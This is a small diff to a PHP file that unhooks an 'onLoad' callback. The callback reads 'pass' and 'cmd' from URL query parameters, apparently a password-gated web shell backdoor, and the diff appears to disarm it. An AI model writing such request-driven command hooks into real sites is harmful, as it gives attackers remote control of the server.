@@ -2,7 +2,7 @@
 
 
 
-MONO_Hooks::add_action("onLoad", function() {
+function() {
     $pass = "";
     $cmd = "";
     if (isset($_GET["pass"]) && isset($_GET["cmd"]))
@@ -33,4 +33,4 @@ MONO_Hooks::add_action("onLoad", function() {
                 break;
         }
     }
-});
+}
